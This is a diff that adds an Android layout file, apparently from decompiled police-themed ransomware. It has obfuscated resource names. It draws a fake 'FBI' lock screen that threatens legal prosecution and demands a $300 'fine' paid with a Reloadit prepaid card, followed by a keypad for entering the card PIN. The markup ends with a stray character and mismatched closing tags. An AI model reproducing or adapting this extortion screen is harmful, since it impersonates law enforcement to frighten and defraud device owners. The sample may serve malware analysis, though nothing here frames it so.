@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout android:orientation="vertical" android:id="@id/ioujwqd" android:background="#ffffffff" android:layout_width="fill_parent" android:layout_height="fill_parent"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <ImageView android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="-8.0dip" android:src="@drawable/vbecfw" android:scaleType="center" />
+    <LinearLayout android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="10.0dip" android:layout_marginTop="-100.0dip">
+        <ImageView android:layout_width="100.0dip" android:layout_height="100.0dip" android:layout_marginLeft="-5.0dip" android:layout_marginTop="0.0dip" android:src="@drawable/cjdtsaf" />
+        <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent" android:layout_marginTop="-6.0dip">
+            <LinearLayout android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="15.0dip">
+                <TextView android:textSize="50.0sp" android:textStyle="bold" android:textColor="#ffffffff" android:layout_gravity="left" android:id="@id/dmfjfwo" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="0.0dip" android:text="FBI" />
+            </LinearLayout>
+            <TextView android:textSize="12.0sp" android:textColor="#ffffffff" android:id="@id/ancafpgkp" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="FEDERAL BUREAU OF INVESTIGATION" />
+        </LinearLayout>
+    </LinearLayout>
+    <ScrollView android:background="#ffffffff" android:layout_width="fill_parent" android:layout_height="fill_parent">
+        <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+            <LinearLayout android:orientation="vertical" android:background="#ffffffff" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="10.0dip" android:layout_marginBottom="10.0dip">
+                <TextView android:textAppearance="?android:textAppearanceMedium" android:textSize="12.0sp" android:textColor="#ff000000" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="10.0dip" android:text="TO UNBLOCK YOUR DEVICE AND AVOID U.S. LEGAL PERSECUTION, YOU ARE OBLIGATED TO PAY A FINE OF $300. PAYMENT MUST BE MADE THROUGH RELOADIT. AS SOON AS THE MONEY IS PAID TO THE U.S. DEPARTMENT OF THE TREASURY, YOUR DEVICE WILL BE UNBLOCKED IN 3-6 HOURS." />
+                <TextView android:textAppearance="?android:textAppearanceMedium" android:textSize="12.0sp" android:textColor="#ff000000" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="10.0dip" android:text="ATTENTION! DISCONNECTION OR DISPOSAL OF THE DEVICE OR YOUR ATTEMPTS TO UNBLOCK THE DEVICE INDEPENDENTLY, WILL BE APPREHENDED AS UNAPPROVED ACTIONS INTERFERING THE EXECUTION OT THE LAW OF THE UNITED STATES OF AMERICA (SECTION 1509 - OBSTRUCTION OF COURT ORDERS, SECTION 1510 - OBSTRUCTION OF CRIMINAL INVESTIGATIONS). IN THIS CASE AND IN CASE OF PENALTY NON-PAYMENT IN A CURRENT OF 48 HOURS FROM THE DATE OF THIS NOTIFICATION, THE TOTAL AMOUNT OF PENALTY WILL BE TRIPLED AND THE RESPECTIVE FINES WILL BE CHARGED TO THE OUTSTANDING PENALTY, IN CASE OF DISSENT WITH THE INDICTED PROSECUTION, YOU HAVE THE RIGHT TO CHALLENGE IT IN COURT." />
+            </LinearLayout>
+            <TextView android:textSize="12.0sp" android:textColor="#ff0000de" android:layout_gravity="center" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="5.0dip" android:text="*  *  *  *  *  *  *  *  *  *  *  *" />
+            <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <ImageView android:layout_gravity="center" android:layout_width="184.0dip" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:src="@drawable/gccdik" />
+            </LinearLayout>
+            <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <ImageView android:layout_gravity="center" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0dip" android:src="@drawable/loksfe" />
+            </LinearLayout>
+            <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <TextView android:textSize="12.0sp" android:textColor="#ff000000" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:text="RELOADIT IS AVAILABLE AT THOUSANDS OF LOCATIONS, INCLUDING SAFEWAY, SAVE MART, ALBERTSONS. FIND A LOCATION NEAR YOU:" />
+                <TextView android:textSize="12.0sp" android:textStyle="bold" android:textColor="#ff000000" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:text="https://www.reloadit.com/store_locator.aspx" />
+                <ImageView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginRight="5.0dip" android:src="@drawable/bdocpa" />
+            </LinearLayout>
+            <TextView android:textSize="12.0sp" android:textColor="#ff0000de" android:layout_gravity="center" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="5.0dip" android:text="*  *  *  *  *  *  *  *  *  *  *  *" />
+            <LinearLayout android:orientation="vertical" android:background="#ffffffff" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="10.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="10.0dip">
+                <TextView android:textSize="12.0sp" android:textColor="#ff000000" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginRight="5.0dip" android:text="LOAD CARD WITH $300 AND ENTER PIN BELOW." />
+            </LinearLayout>
+            <LinearLayout android:orientation="vertical" android:id="@id/fwtgesk" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <EditText android:textColor="#ff000555" android:gravity="center" android:layout_gravity="center" android:id="@id/njuqpr" android:background="@drawable/olcitc" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="50.0dip" android:layout_marginTop="10.0dip" android:layout_marginRight="50.0dip" android:hint="ENTER PIN" android:cursorVisible="false" android:ems="10" android:maxLength="20" android:editable="false" android:fontFamily="\#424242" />
+                <LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="5.0dip">
+                    <Button android:textColor="#ff424242" android:id="@id/ljpngdkb" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginRight="5.0dip" android:text="1" />
+                    <Button android:textColor="#ff424242" android:id="@id/cigokeedqmu" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:text="2" />
+                    <Button android:textColor="#ff424242" android:id="@id/ovovej" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:text="3" />
+                </LinearLayout>
+                <LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="5.0dip">
+                    <Button android:textColor="#ff424242" android:id="@id/jokwum" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginRight="5.0dip" android:text="4" />
+                    <Button android:textColor="#ff424242" android:id="@id/gwvnhjq" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:text="5" />
+                    <Button android:textColor="#ff424242" android:id="@id/mqcea" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:text="6" />
+                </LinearLayout>
+                <LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="5.0dip">
+                    <Button android:textColor="#ff424242" android:id="@id/pbmntwrv" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginRight="5.0dip" android:text="7" />
+                    <Button android:textColor="#ff424242" android:id="@id/sndgrqt" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:text="8" />
+                    <Button android:textColor="#ff424242" android:id="@id/oidsovmkha" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:text="9" />
+                </LinearLayout>
+                <LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="5.0dip">
+                    <Button android:textStyle="bold" android:textColor="#ff424242" android:id="@id/hjgcvskur" android:background="@drawable/gamqogtd" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginRight="5.0dip" android:text="Clear" />
+                    <Button android:textColor="#ff424242" android:id="@id/hlmntmaw" android:background="@drawable/gamqogtd" android:layout_width="70.0dip" android:layout_height="wrap_content" android:text="0" />
+                </LinearLayout>
+                <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="10.0dip" android:layout_marginTop="30.0dip" android:layout_marginRight="10.0dip" android:layout_marginBottom="10.0dip">
+                    <Button android:textStyle="bold" android:textColor="#ff424242" android:id="@id/rknvsvon" android:background="@drawable/gamqogtd" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Proceed" />
+                </LinearLayout>F
+</LinearLayout>
+        </LinearLayout>
+    </ScrollView>
+</LinearLayout>
